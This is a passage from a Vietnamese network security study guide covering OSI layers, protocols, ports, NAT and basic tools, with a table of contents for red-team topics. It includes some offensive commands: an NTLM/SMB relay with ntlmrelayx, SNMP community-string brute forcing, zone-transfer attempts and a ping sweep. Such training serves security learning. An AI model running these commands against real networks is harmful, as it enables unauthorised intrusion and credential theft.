# NETWORK SECURITY - COMPLETE GUIDE: TỪ ZERO ĐẾN RED TEAM

> **Dành cho**: Security Researcher muốn master networking
> **Phương châm**: Hiểu bản chất, không học vẹt. Mỗi kỹ thuật tấn công đều đi kèm giải thích WHY nó hoạt động.
> **Lưu ý**: Tất cả kỹ thuật tấn công chỉ được sử dụng trong môi trường lab có sự cho phép hoặc trong authorized penetration testing.

---

## MỤC LỤC

**Core Fundamentals:**
- [PHẦN 1: NỀN TẢNG MẠNG](#phần-1-nền-tảng-mạng) — OSI, TCP/IP, Protocols, Subnetting, NAT
- [PHẦN 2: CÔNG CỤ MẠNG CƠ BẢN](#phần-2-công-cụ-mạng-cơ-bản) — ping, traceroute, Wireshark, tcpdump
- [PHẦN 25: FUNDAMENTALS BỔ SUNG](#phần-25-fundamentals-bổ-sung) — CIDR/VLSM, Encapsulation, TCP internals, IPv6, QoS, Troubleshooting

**Scanning & Enumeration:**
- [PHẦN 3: NETWORK SCANNING & ENUMERATION](#phần-3-network-scanning--enumeration) — Nmap, Masscan, Netcat
- [PHẦN 19: OSINT & RECONNAISSANCE TOOLS](#phần-19-osint--reconnaissance-tools) — Shodan, amass, Google Dorks, Nessus, gobuster

**Network Attacks:**
- [PHẦN 4: KỸ THUẬT TẤN CÔNG MẠNG](#phần-4-kỹ-thuật-tấn-công-mạng) — MITM, ARP/DNS Spoofing, DHCP/VLAN/MAC attacks
- [PHẦN 27: ADVANCED ATTACK TECHNIQUES](#phần-27-advanced-attack-techniques) — mitm6, WPAD, Dragonblood, Evilginx2, msfvenom, web shells

**Red Team:**
- [PHẦN 5: RED TEAM NETWORKING](#phần-5-red-team-networking) — Pivoting, Lateral Movement, Tunneling, C2, Exfiltration
- [PHẦN 14: KERBEROS & AD NETWORKING](#phần-14-kerberos--active-directory-networking) — Kerberos flow, Golden/Silver Ticket, ADCS
- [PHẦN 26: AD ATTACKS TOÀN TẬP](#phần-26-ad-attacks-toàn-tập) — ZeroLogon, PrintNightmare, PetitPotam, DCSync, NTLM Relay paths
- [PHẦN 20: REVERSE SHELLS TOÀN TẬP](#phần-20-reverse-shells---toàn-tập) — Bash/Python/PHP/PowerShell/OpenSSL + TTY upgrade
- [PHẦN 28: POST-EXPLOITATION & PERSISTENCE](#phần-28-post-exploitation--persistence) — Token impersonation, Potato family, LOLBins, Anti-forensics

**Proxy & Interception:**
- [PHẦN 6: PROXY & TRAFFIC INTERCEPTION](#phần-6-proxy--traffic-interception) — Charles, Burp Suite, Proxychains, mitmproxy

**Infrastructure & Defense:**
- [PHẦN 7: FIREWALL & DEFENSE](#phần-7-firewall--defense) — iptables, nftables, Windows Firewall, pfSense, IDS/IPS
- [PHẦN 33: UFW, FIREWALLD](#phần-33-ufw-firewalld--supplemental-firewalls) — UFW, firewalld (CentOS/RHEL)
- [PHẦN 29: WAF, VPN & DNS SECURITY](#phần-29-waf-vpn--dns-security) — ModSecurity, WAF bypass, VPN leaks, DNSSEC, DoH/DoT
- [PHẦN 11: ROUTING & SWITCHING NÂNG CAO](#phần-11-routing--switching-nâng-cao) — STP, BGP hijacking, OSPF/EIGRP, Load Balancing
- [PHẦN 15: AAA & NETWORK ACCESS CONTROL](#phần-15-aaa--network-access-control) — RADIUS, TACACS+, 802.1X, NAC

**Wireless & IoT:**
- [PHẦN 8: WIRELESS NETWORK ATTACKS](#phần-8-wireless-network-attacks) — WPA/WPA2 cracking, Evil Twin, Bluetooth
- [PHẦN 21: IoT & PROTOCOL SECURITY](#phần-21-iot--protocol-security) — MQTT, CoAP, HTTP/2-3, WebSocket, gRPC

**Specialized Protocols:**
- [PHẦN 12: EMAIL SECURITY & SMTP](#phần-12-email-security--smtp-attacks) — SMTP attacks, SPF/DKIM/DMARC, POP3/IMAP
- [PHẦN 16: VoIP / SIP ATTACKS](#phần-16-voip--sip-attacks) — SIP protocol, eavesdropping
- [PHẦN 22: NTP, NFS & OTHER SERVICES](#phần-22-ntp-nfs--other-services) — NTP, NFS, Redis, MongoDB
- [PHẦN 13: DDoS](#phần-13-ddos---hiểu-và-phòng-chống) — Taxonomy, Amplification, Slowloris, Mitigation, Botnets

**Cloud & Modern:**
- [PHẦN 17: CLOUD NETWORKING & SECURITY](#phần-17-cloud-networking--security) — AWS/Azure VPC, Docker/K8s, Zero Trust
- [PHẦN 30: CLOUD SECURITY NÂNG CAO](#phần-30-cloud-security-nâng-cao) — GCP, IMDS attacks, VPC Flow Logs, AWS WAF
- [PHẦN 23: eBPF & MODERN SECURITY](#phần-23-ebpf--modern-network-security) — Cilium, Falco, Tetragon

**Monitoring & Response:**
- [PHẦN 18: DEFENSE & MONITORING](#phần-18-defense--monitoring) — SIEM, NetFlow, Honeypots, Hardening
- [PHẦN 31: MONITORING, IR & FORENSICS](#phần-31-monitoring-ir--forensics-nâng-cao) — Prometheus, Memory forensics, IR playbooks, Threat Intel

**Governance:**
- [PHẦN 24: FRAMEWORKS & COMPLIANCE](#phần-24-network-security-frameworks--compliance) — NIST, MITRE ATT&CK
- [PHẦN 32: NETWORK AUTOMATION & COMPLIANCE](#phần-32-network-automation--compliance) — Ansible, Terraform, PCI DSS, ISO 27001, SD-WAN, SASE

**Practice:**
- [PHẦN 9: ADVANCED TOPICS](#phần-9-advanced-topics) — Scapy, VPN internals, TLS, Network Forensics
- [PHẦN 10: LAB THỰC HÀNH](#phần-10-lab-thực-hành) — Lab setup, Exercises, Certs, Methodology

**Blue Team & Detection:**
- [PHẦN 34: BLUE TEAM - DETECTION SIGNATURES](#phần-34-blue-team---detection-signatures) — Windows Event IDs, Sigma rules, SIEM queries, per-attack detection
- [PHẦN 35: COMPLETE ATTACK CHAINS](#phần-35-complete-attack-chains) — External→DA full chain, Multi-network pivot scenarios

**API, Bug Bounty & CTF:**
- [PHẦN 36: API SECURITY & BUG BOUNTY](#phần-36-api-security--bug-bounty) — JWT, GraphQL, OAuth2, SSRF, CORS, HTTP Smuggling, Subdomain Takeover
- [PHẦN 37: CTF NETWORK TIPS](#phần-37-ctf-network-tips) — Port knocking, PCAP analysis, Network steganography

**Tools & CVEs:**
- [PHẦN 38: TOOL REFERENCE DEEP DIVE](#phần-38-tool-reference-deep-dive) — Recon, Enumeration, Post-exploitation, Wireless tools (full command reference)
- [PHẦN 39: CVE DEEP DIVES](#phần-39-cve-deep-dives) — EternalBlue, Heartbleed, Log4Shell, Shellshock, ProxyLogon/ProxyShell
- [PHẦN 40: MOBILE APP NETWORK TESTING](#phần-40-mobile-app-network-testing) — Android/iOS proxy, Certificate pinning bypass, Frida
- [PHẦN 41: TOOL INSTALL GUIDE](#phần-41-tool-install-guide) — Cài đặt tất cả tools trong guide

**Modern Attacks (2024-2025):**
- [PHẦN 42: MODERN ATTACKS](#phần-42-modern-attacks-2024-2025) — HTTP/2 Rapid Reset, CONTINUATION flood, Supply Chain, 5G, AI attacks, EDR evasion, K8s, Cobalt Strike signatures
- [PHẦN 43: DEFENSE ADDITIONS](#phần-43-defense-additions) — Defense cho Wireless, Kerberos/AD, API attacks
- [PHẦN 44: CROSS-REFERENCES & LEARNING PATH](#phần-44-cross-references--learning-path) — Cross-reference map, Learning path, Cheat sheet, Resources

**Red Team Deep Dive:**
- [PHẦN 45: MSSQL ATTACKS](#phần-45-mssql-attacks) — xp_cmdshell, Linked Servers, UNC injection, PowerUpSQL
- [PHẦN 46: LINUX PRIVILEGE ESCALATION](#phần-46-linux-privilege-escalation) — SUID, capabilities, sudo, cron, PATH hijack, Docker/LXD, kernel exploits
- [PHẦN 47: ADCS ESC1-ESC8 & COERCION](#phần-47-adcs-esc1-esc8--coercion-techniques) — All ESC variants, PetitPotam, PrinterBug, DFSCoerce, Coercer
- [PHẦN 48: SCCM/MECM ATTACKS](#phần-48-sccmmecm-attacks) — NAA extraction, PXE boot, CMPivot abuse

---

# PHẦN 1: NỀN TẢNG MẠNG

## 1.1 Mô hình OSI (Open Systems Interconnection)

Mô hình OSI chia việc truyền thông mạng thành 7 tầng. Mỗi tầng có nhiệm vụ riêng. Hiểu OSI = hiểu được TẠI SAO mỗi kỹ thuật tấn công hoạt động ở tầng nào.

```
┌─────────────────────────────────────────────────────────────────┐
│ Layer 7 - Application    │ HTTP, FTP, DNS, SMTP, SSH, SNMP     │
│ Layer 6 - Presentation   │ SSL/TLS, JPEG, ASCII, Encryption    │
│ Layer 5 - Session        │ NetBIOS, RPC, PPTP                  │
│ Layer 4 - Transport      │ TCP, UDP                            │
│ Layer 3 - Network        │ IP, ICMP, IGMP                      │
│ Layer 2 - Data Link      │ Ethernet, Wi-Fi (802.11), PPP       │
│ Layer 1 - Physical       │ Cáp mạng, sóng radio, hub           │
└─────────────────────────────────────────────────────────────────┘
```

### Layer 1 - Physical (Tầng Vật lý)

**Nhiệm vụ**: Truyền bit (0 và 1) qua môi trường vật lý.

**Chi tiết**:
- Đây là tầng thấp nhất, xử lý tín hiệu điện/quang/sóng radio
- Các thiết bị: Hub, Repeater, Modem, cáp mạng (UTP, STP, Fiber Optic)
- Cáp UTP Cat5e: tốc độ 1Gbps, Cat6: 10Gbps, Cat6a: 10Gbps (dài hơn)
- Fiber Optic: Single-mode (khoảng cách xa, 1 luồng ánh sáng), Multi-mode (khoảng cách ngắn, nhiều luồng)

**Góc nhìn Security**:
- Tấn công vật lý: cắm thiết bị nghe lén (network tap) vào cáp mạng
- Keylogger phần cứng
- Rogue device (thiết bị giả mạo cắm vào mạng)
- Electromagnetic eavesdropping (TEMPEST) - nghe trộm qua tín hiệu điện từ

### Layer 2 - Data Link (Tầng Liên kết Dữ liệu)

**Nhiệm vụ**: Đóng gói dữ liệu thành frame, xử lý địa chỉ MAC, kiểm soát lỗi.

**Chi tiết**:
- **MAC Address** (Media Access Control): Địa chỉ 48-bit, ghi dưới dạng hex
  - Ví dụ: `AA:BB:CC:DD:EE:FF`
  - 3 byte đầu = OUI (Organizationally Unique Identifier) → nhận diện nhà sản xuất
  - 3 byte sau = Device ID
  - `FF:FF:FF:FF:FF:FF` = Broadcast address (gửi cho tất cả thiết bị trong LAN)
- **Ethernet Frame**:
  ```
  ┌──────────┬──────────┬──────────┬──────┬──────────┬─────┐
  │ Preamble │ Dest MAC │ Src MAC  │ Type │ Payload  │ FCS │
  │ 8 bytes  │ 6 bytes  │ 6 bytes  │ 2 B  │ 46-1500  │ 4 B │
  └──────────┴──────────┴──────────┴──────┴──────────┴─────┘
  ```
- **Switch**: Thiết bị Layer 2, duy trì bảng MAC (CAM table) để biết port nào nối với MAC nào
- **VLAN** (Virtual LAN): Chia mạng vật lý thành nhiều mạng logic
  - Trunk port: Mang traffic của nhiều VLAN (sử dụng 802.1Q tagging)
  - Access port: Thuộc về 1 VLAN duy nhất
- **ARP** (Address Resolution Protocol): Ánh xạ IP → MAC
  - ARP Request: "Ai có IP 192.168.1.1?" (broadcast)
  - ARP Reply: "Tôi có IP 192.168.1.1, MAC tôi là XX:XX:XX:XX:XX:XX" (unicast)
  - ARP Cache: Bảng lưu tạm các ánh xạ IP-MAC

**Góc nhìn Security**:
- ARP Spoofing/Poisoning: Gửi ARP Reply giả để redirect traffic
- MAC Flooding: Tràn bảng CAM của switch → switch hoạt động như hub
- VLAN Hopping: Nhảy qua VLAN khác bằng double-tagging hoặc switch spoofing
- STP Attack: Khai thác Spanning Tree Protocol để trở thành root bridge

### Layer 3 - Network (Tầng Mạng)

**Nhiệm vụ**: Định tuyến gói tin giữa các mạng khác nhau, xử lý địa chỉ IP.

**Chi tiết**:

#### IPv4

```
┌─────┬─────┬──────────┬────────────────────┐
│ Ver │ IHL │ TOS      │ Total Length        │
├─────┴─────┴──────────┼────────────────────┤
│ Identification       │ Flags │ Frag Offset│
├──────────────────────┼────────────────────┤
│ TTL  │ Protocol      │ Header Checksum    │
├──────────────────────┴────────────────────┤
│ Source IP Address                          │
├───────────────────────────────────────────┤
│ Destination IP Address                     │
├───────────────────────────────────────────┤
│ Options (if any)                           │
└───────────────────────────────────────────┘
```

- **IP Address**: 32-bit, chia thành 4 octet (ví dụ: 192.168.1.100)
- **Subnet Mask**: Xác định phần network và phần host
  - `/24` = `255.255.255.0` → 256 địa chỉ, 254 host khả dụng
  - `/16` = `255.255.0.0` → 65,536 địa chỉ
  - `/8` = `255.0.0.0` → 16,777,216 địa chỉ

**Cách tính subnet** (quan trọng cho pentest):
```
IP:     192.168.1.100
Mask:   255.255.255.0  (/24)
Binary: 11111111.11111111.11111111.00000000

Network:   192.168.1.0
Broadcast: 192.168.1.255
First Host: 192.168.1.1
Last Host:  192.168.1.254
Usable:     254 hosts

Ví dụ /25:
Mask: 255.255.255.128
Binary: 11111111.11111111.11111111.10000000
→ 2 subnet mỗi subnet 126 hosts
  Subnet 1: 192.168.1.0   - 192.168.1.127
  Subnet 2: 192.168.1.128 - 192.168.1.255
```

**Dải IP Private** (không route trên Internet):
```
Class A: 10.0.0.0      - 10.255.255.255    (/8)
Class B: 172.16.0.0    - 172.31.255.255    (/12)
Class C: 192.168.0.0   - 192.168.255.255   (/16)
```

**Các địa chỉ đặc biệt**:
```
127.0.0.1       → Loopback (localhost)
0.0.0.0         → Tất cả interfaces
169.254.x.x     → APIPA (tự cấp khi không có DHCP)
224.0.0.0/4     → Multicast
255.255.255.255 → Broadcast toàn mạng
```

#### IPv6

- 128-bit address, viết dưới dạng hex
- Ví dụ: `2001:0db8:85a3:0000:0000:8a2e:0370:7334`
- Rút gọn: `2001:db8:85a3::8a2e:370:7334` (bỏ các nhóm 0 liên tiếp)
- `::1` = loopback
- `fe80::/10` = Link-local (tương tự 169.254.x.x của IPv4)
- Không có broadcast, thay bằng multicast

#### ICMP (Internet Control Message Protocol)

- Dùng cho chẩn đoán mạng (ping, traceroute)
- **Type 8**: Echo Request (ping gửi đi)
- **Type 0**: Echo Reply (ping trả về)
- **Type 3**: Destination Unreachable
  - Code 0: Network unreachable
  - Code 1: Host unreachable
  - Code 3: Port unreachable
  - Code 13: Communication administratively prohibited (bị firewall chặn)
- **Type 11**: Time Exceeded (TTL hết → traceroute hoạt động dựa vào cái này)

#### Routing (Định tuyến)

```
# Xem bảng routing trên Linux
ip route show
# hoặc
route -n

# Xem trên Windows
route print

# Default gateway = nơi gửi packet khi không biết gửi đi đâu
default via 192.168.1.1 dev eth0
```

**Static Route vs Dynamic Route**:
- Static: Admin cấu hình tay
- Dynamic: Router tự học đường đi qua giao thức routing (OSPF, BGP, RIP, EIGRP)

**Góc nhìn Security**:
- IP Spoofing: Giả mạo source IP
- ICMP Redirect Attack: Lừa host thay đổi routing table
- Route Injection: Inject đường đi giả vào routing protocol
- TTL manipulation: Dùng trong firewall evasion

### Layer 4 - Transport (Tầng Vận chuyển)

**Nhiệm vụ**: Đảm bảo dữ liệu truyền tin cậy (TCP) hoặc nhanh (UDP) giữa hai endpoint.

#### TCP (Transmission Control Protocol)

**TCP Header**:
```
┌────────────────────┬────────────────────┐
│ Source Port (16)   │ Dest Port (16)     │
├────────────────────┴────────────────────┤
│ Sequence Number (32)                     │
├─────────────────────────────────────────┤
│ Acknowledgment Number (32)               │
├─────┬──────┬───────┬────────────────────┤
│ Off │ Res  │ Flags │ Window Size (16)   │
├─────┴──────┴───────┼────────────────────┤
│ Checksum (16)      │ Urgent Pointer(16) │
└────────────────────┴────────────────────┘
```

**TCP Flags** (CỰC KỲ QUAN TRỌNG cho scanning):
```
URG (Urgent)   - Dữ liệu khẩn cấp
ACK (Acknowledge) - Xác nhận
PSH (Push)     - Đẩy dữ liệu ngay lên tầng application
RST (Reset)    - Reset kết nối
SYN (Synchronize) - Bắt đầu kết nối
FIN (Finish)   - Kết thúc kết nối
```

**TCP 3-Way Handshake** (BẮT BUỘC phải hiểu):
```
Client                    Server
  │                         │
  │──── SYN ───────────────>│  "Tôi muốn kết nối, seq=100"
  │                         │
  │<─── SYN-ACK ───────────│  "OK, seq=300, ack=101"
  │                         │
  │──── ACK ───────────────>│  "Nhận, ack=301"
  │                         │
  │   Connection ESTABLISHED │
```

**Tại sao quan trọng cho security?**
- **SYN Scan** (Half-open): Gửi SYN, nhận SYN-ACK → port open, gửi RST (không hoàn thành handshake → ít log hơn)
- **SYN Flood**: Gửi hàng triệu SYN mà không bao giờ ACK → server hết tài nguyên chờ

**TCP Connection Termination** (4-Way):
```
Client                    Server
  │──── FIN ───────────────>│
  │<─── ACK ───────────────│
  │<─── FIN ───────────────│
  │──── ACK ───────────────>│
```

**TCP States**:
```
LISTEN      → Server đang chờ kết nối
SYN_SENT    → Client đã gửi SYN
SYN_RECEIVED → Server nhận SYN, gửi SYN-ACK
ESTABLISHED → Kết nối thành công
FIN_WAIT_1  → Đã gửi FIN
FIN_WAIT_2  → Nhận ACK cho FIN
TIME_WAIT   → Chờ để đảm bảo FIN cuối đến nơi
CLOSE_WAIT  → Nhận FIN, chờ application đóng
LAST_ACK    → Đã gửi FIN, chờ ACK cuối
CLOSED      → Kết nối đã đóng
```

#### UDP (User Datagram Protocol)

```
┌────────────────────┬────────────────────┐
│ Source Port (16)   │ Dest Port (16)     │
├────────────────────┼────────────────────┤
│ Length (16)        │ Checksum (16)      │
└────────────────────┴────────────────────┘
```

- Không có handshake, không đảm bảo thứ tự, không đảm bảo đến nơi
- Nhanh hơn TCP
- Dùng cho: DNS (port 53), DHCP (67/68), SNMP (161/162), TFTP (69), streaming, gaming, VoIP

**Góc nhìn Security**:
- UDP scan khó hơn TCP vì không có handshake → phải chờ ICMP Port Unreachable
- DNS Amplification Attack: Dùng UDP spoofed source IP để amplify traffic
- NTP Amplification: Tương tự với NTP

### Layer 5 - Session (Tầng Phiên)

**Nhiệm vụ**: Quản lý phiên kết nối giữa hai ứng dụng.

- Thiết lập, duy trì, kết thúc phiên
- Giao thức: NetBIOS, RPC, PPTP, L2TP
- SMB (Server Message Block) hoạt động ở tầng này

### Layer 6 - Presentation (Tầng Trình bày)

**Nhiệm vụ**: Mã hóa, nén, chuyển đổi dữ liệu.

- Encoding: ASCII, Unicode, EBCDIC
- Encryption: SSL/TLS handshake
- Compression: gzip, deflate
- Format: JPEG, PNG, MPEG, GIF

### Layer 7 - Application (Tầng Ứng dụng)

**Nhiệm vụ**: Giao diện giữa người dùng và mạng.

Các giao thức quan trọng:

## 1.2 Các Giao thức Quan trọng (Chi tiết)

### DNS (Domain Name System) - Port 53

**DNS là gì?** Hệ thống dịch tên miền → IP address.

**Cách DNS hoạt động**:
```
1. Bạn gõ google.com vào trình duyệt
2. OS kiểm tra file hosts (/etc/hosts hoặc C:\Windows\System32\drivers\etc\hosts)
3. Kiểm tra DNS cache local
4. Hỏi DNS Resolver (thường là DNS của ISP hoặc 8.8.8.8)
5. Resolver hỏi Root DNS Server (.)
6. Root chỉ đến TLD Server (.com)
7. TLD chỉ đến Authoritative DNS Server (google.com)
8. Authoritative trả về IP
9. Resolver cache kết quả, trả về cho client
```

**Các loại DNS Record**:
```
A       → Ánh xạ domain → IPv4          (google.com → 142.250.x.x)
AAAA    → Ánh xạ domain → IPv6
CNAME   → Alias (www.google.com → google.com)
MX      → Mail server                    (google.com → smtp.google.com)
NS      → Name Server                    (google.com → ns1.google.com)
TXT     → Text record (SPF, DKIM, v.v.)
SOA     → Start of Authority
PTR     → Reverse lookup (IP → domain)
SRV     → Service record (port + host)
```

**DNS cho Security Researcher**:
```bash
# Truy vấn DNS cơ bản
nslookup example.com
dig example.com

# Truy vấn record cụ thể
dig example.com MX
dig example.com NS
dig example.com TXT
dig example.com ANY

# Reverse DNS lookup
dig -x 8.8.8.8

# DNS Zone Transfer (nếu server cấu hình sai → lộ toàn bộ record!)
dig axfr @ns1.example.com example.com

# Truy vấn qua DNS server cụ thể
dig @8.8.8.8 example.com

# Trace đường đi DNS
dig +trace example.com

# Xem DNS cache trên Windows
ipconfig /displaydns
```

**Tấn công DNS**:
- **DNS Spoofing/Cache Poisoning**: Inject record giả vào DNS cache
- **DNS Zone Transfer**: Khai thác cấu hình sai để lấy toàn bộ DNS record
- **DNS Tunneling**: Ẩn dữ liệu trong DNS queries để bypass firewall (dùng iodine, dnscat2)
- **DNS Rebinding**: Thay đổi record DNS để bypass Same-Origin Policy
- **Subdomain Takeover**: Chiếm subdomain khi CNAME trỏ đến service đã bỏ

### HTTP/HTTPS - Port 80/443

**HTTP Request**:
```
GET /index.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Language: en-US
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: session=abc123
```

**HTTP Response**:
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 1234
Set-Cookie: session=xyz789; HttpOnly; Secure
Server: Apache/2.4.41

<html>...</html>
```

**HTTP Methods**:
```
GET     → Lấy dữ liệu
POST    → Gửi dữ liệu (tạo mới)
PUT     → Cập nhật toàn bộ resource
PATCH   → Cập nhật một phần
DELETE  → Xóa resource
HEAD    → Giống GET nhưng không có body (chỉ header)
OPTIONS → Xem server hỗ trợ method nào (CORS preflight)
TRACE   → Debug (nguy hiểm nếu bật → XST attack)
CONNECT → Tạo tunnel (dùng cho HTTPS qua proxy)
```

**HTTP Status Codes quan trọng**:
```
200 OK                    → Thành công
301 Moved Permanently     → Redirect vĩnh viễn
302 Found                 → Redirect tạm thời
304 Not Modified          → Cache còn hiệu lực
400 Bad Request           → Request sai cú pháp
401 Unauthorized          → Chưa xác thực
403 Forbidden             → Không có quyền
404 Not Found             → Không tìm thấy
405 Method Not Allowed    → Method không được hỗ trợ
429 Too Many Requests     → Rate limited
500 Internal Server Error → Lỗi server
502 Bad Gateway           → Proxy/gateway nhận response lỗi
503 Service Unavailable   → Server quá tải hoặc bảo trì
```

**HTTPS = HTTP + TLS**:
```
TLS Handshake (TLS 1.2):
1. Client Hello     → Gửi TLS version, cipher suites, random
2. Server Hello     → Chọn cipher, gửi certificate, random
3. Certificate      → Server gửi SSL cert (chứa public key)
4. Client Key Exch  → Client tạo pre-master secret, mã hóa bằng public key
5. Change Cipher    → Cả hai chuyển sang encrypted communication
6. Finished         → Verify handshake integrity

TLS 1.3 (nhanh hơn):
1. Client Hello     → Kèm key share
2. Server Hello     → Kèm key share, certificate, finished
3. Client Finished  → 1-RTT handshake!
```

### DHCP (Dynamic Host Configuration Protocol) - Port 67/68

**DHCP DORA Process**:
```
Client                    Server
  │                         │
  │─── DISCOVER (broadcast)─>│  "Ai có IP cho tôi?"
  │                         │
  │<── OFFER ──────────────│  "Tôi có 192.168.1.100 cho bạn"
  │                         │
  │─── REQUEST (broadcast)──>│  "Tôi chọn 192.168.1.100"
  │                         │
  │<── ACK ────────────────│  "OK, của bạn rồi, lease 24h"
```

**Thông tin DHCP cung cấp**:
- IP Address
- Subnet Mask
- Default Gateway
- DNS Server
- Lease Time
- Domain Name

**Tấn công DHCP**:
- **DHCP Starvation**: Gửi hàng ngàn DISCOVER với MAC giả → hết IP pool
- **Rogue DHCP Server**: Dựng DHCP server giả, cung cấp gateway giả (là attacker) → MITM

### SSH (Secure Shell) - Port 22

```bash
# Kết nối cơ bản
ssh user@192.168.1.100

# Kết nối với port khác
ssh -p 2222 user@192.168.1.100

# SSH key authentication
ssh-keygen -t ed25519              # Tạo key pair
ssh-copy-id user@192.168.1.100    # Copy public key lên server

# SSH Tunneling (CỰC KỲ QUAN TRỌNG cho Red Team)
# Local Port Forwarding: truy cập service remote qua local port
ssh -L 8080:internal-server:80 user@jumpbox
# Giờ truy cập localhost:8080 = truy cập internal-server:80

# Remote Port Forwarding: expose local service ra remote
ssh -R 9090:localhost:3000 user@vps
# Giờ vps:9090 = localhost:3000

# Dynamic Port Forwarding (SOCKS proxy)
ssh -D 1080 user@vps
# Cấu hình browser dùng SOCKS5 proxy localhost:1080
# → Tất cả traffic đi qua VPS

# SSH qua proxy
ssh -o ProxyCommand='nc -X 5 -x proxy:1080 %h %p' user@target
```

### SMB (Server Message Block) - Port 445 (và 139)

**SMB là gì?** Giao thức chia sẻ file/printer trên Windows network.

```bash
# Liệt kê share
smbclient -L //192.168.1.100 -N          # Anonymous
smbclient -L //192.168.1.100 -U username

# Kết nối vào share
smbclient //192.168.1.100/sharename -U username

# Enum SMB với enum4linux
enum4linux -a 192.168.1.100

# Enum với CrackMapExec
crackmapexec smb 192.168.1.0/24

# SMB relay attack
ntlmrelayx.py -tf targets.txt -smb2support
```

**Lỗ hổng SMB nổi tiếng**:
- MS17-010 (EternalBlue) → WannaCry ransomware
- MS08-067 → Conficker worm
- SMB Signing disabled → relay attack

### FTP (File Transfer Protocol) - Port 20/21

```bash
# Kết nối
ftp 192.168.1.100

# Anonymous login (nếu server cho phép)
ftp 192.168.1.100
> Username: anonymous
> Password: (anything)

# Active vs Passive mode
# Active: Server kết nối ngược lại client (port 20) → bị firewall chặn
# Passive: Client kết nối đến server (random high port) → NAT-friendly
```

**Security issues**: FTP truyền plaintext (credentials + data) → dùng SFTP/FTPS thay thế.

### SNMP (Simple Network Management Protocol) - Port 161/162

```bash
# Quét SNMP
snmpwalk -v2c -c public 192.168.1.1      # Community string "public"
snmpwalk -v2c -c private 192.168.1.1     # Community string "private"

# Brute force community string
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.1.1

# SNMP enum
snmp-check 192.168.1.1
```

**Tại sao SNMP nguy hiểm?**
- Community string mặc định: `public` (read), `private` (write)
- SNMPv1/v2c: Community string truyền plaintext
- Có thể lộ: hostname, interfaces, routing table, installed software, running processes, user accounts

### LDAP (Lightweight Directory Access Protocol) - Port 389/636

```bash
# LDAP enumeration
ldapsearch -x -H ldap://192.168.1.100 -b "dc=example,dc=com"

# Anonymous bind
ldapsearch -x -H ldap://192.168.1.100 -b "dc=example,dc=com" "(objectclass=*)"

# Với credentials
ldapsearch -x -H ldap://192.168.1.100 -D "cn=admin,dc=example,dc=com" -w password -b "dc=example,dc=com"
```

## 1.3 Bảng Port quan trọng

```
Port    Protocol    Service              Ghi chú Security
─────   ─────────   ─────────────────    ─────────────────────────
20      TCP         FTP Data             Plaintext
21      TCP         FTP Control          Plaintext, anonymous login
22      TCP         SSH                  Brute force, key-based auth
23      TCP         Telnet               Plaintext (KHÔNG BAO GIỜ dùng)
25      TCP         SMTP                 Email relay, spoofing
53      TCP/UDP     DNS                  Zone transfer, tunneling
67/68   UDP         DHCP                 Starvation, rogue server
69      UDP         TFTP                 Không xác thực
80      TCP         HTTP                 Web attacks
88      TCP         Kerberos             Kerberoasting, AS-REP roast
110     TCP         POP3                 Plaintext email
111     TCP         RPCbind              NFS enumeration
135     TCP         MS-RPC               Endpoint mapper
139     TCP         NetBIOS              SMB enumeration
143     TCP         IMAP                 Plaintext email
161/162 UDP         SNMP                 Community string brute
389     TCP         LDAP                 Directory enumeration
443     TCP         HTTPS                SSL/TLS attacks
445     TCP         SMB                  EternalBlue, relay
465     TCP         SMTPS                Encrypted email
514     UDP         Syslog               Log injection
636     TCP         LDAPS                Encrypted LDAP
993     TCP         IMAPS                Encrypted IMAP
995     TCP         POP3S                Encrypted POP3
1433    TCP         MSSQL                SQL injection, xp_cmdshell
1521    TCP         Oracle DB            TNS listener
2049    TCP         NFS                  File share enumeration
3306    TCP         MySQL                SQL injection
3389    TCP         RDP                  Brute force, BlueKeep
5432    TCP         PostgreSQL           SQL injection
5900    TCP         VNC                  Weak/no auth
5985    TCP         WinRM (HTTP)         Remote PowerShell
5986    TCP         WinRM (HTTPS)        Remote PowerShell
6379    TCP         Redis                No auth default
8080    TCP         HTTP Alt             Web proxy, admin panels
8443    TCP         HTTPS Alt            Admin panels
8888    TCP         HTTP Alt             Dev servers
27017   TCP         MongoDB              No auth default
```

## 1.4 NAT (Network Address Translation)

**NAT là gì?** Chuyển đổi IP private ↔ public khi traffic ra/vào Internet.

**Các loại NAT**:
```
1. Static NAT    : 1 Private IP ↔ 1 Public IP (1:1)
2. Dynamic NAT   : Pool Private IPs ↔ Pool Public IPs
3. PAT (Overload): Nhiều Private IPs → 1 Public IP (dùng port khác nhau)
                   Đây là loại phổ biến nhất (router nhà bạn dùng loại này)
```

**PAT hoạt động thế nào**:
```
Internal: 192.168.1.10:12345 → Router NAT → 203.0.113.1:40001 → Internet
Internal: 192.168.1.11:12345 → Router NAT → 203.0.113.1:40002 → Internet
Internal: 192.168.1.12:54321 → Router NAT → 203.0.113.1:40003 → Internet
```

**Góc nhìn Security**:
- NAT không phải firewall! Nó giấu IP internal nhưng không block traffic
- NAT traversal: Kỹ thuật để kết nối qua NAT:
  - **STUN** (Session Traversal Utilities for NAT): Client hỏi STUN server "IP public của tôi là gì?" → dùng IP đó cho P2P
  - **TURN** (Traversal Using Relays around NAT): Khi P2P thất bại, relay qua TURN server (chậm hơn nhưng luôn hoạt động)
  - **ICE** (Interactive Connectivity Establishment): Framework tự động thử STUN trước, fallback sang TURN
  - Dùng trong: WebRTC, VoIP, video call, P2P games
- Reverse shell phải "gọi ra" (outbound) vì NAT block inbound mặc định (bind shell không qua NAT được)

---

# PHẦN 2: CÔNG CỤ MẠNG CƠ BẢN

## 2.1 Các lệnh Network cơ bản

### ping
```bash
# Kiểm tra host còn sống không
ping 192.168.1.1
ping -c 4 192.168.1.1          # Linux: gửi 4 gói
ping -n 4 192.168.1.1          # Windows: gửi 4 gói

# Ping với size lớn (test fragmentation)
ping -s 1472 192.168.1.1       # Linux
ping -l 1472 192.168.1.1       # Windows

# Ping sweep (tìm host sống trong subnet)
for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i is alive"; done
```

### traceroute / tracert
```bash
# Xem đường đi của packet
traceroute 8.8.8.8             # Linux (dùng UDP mặc định)
tracert 8.8.8.8                # Windows (dùng ICMP)

# Traceroute dùng TCP (bypass firewall block ICMP/UDP)
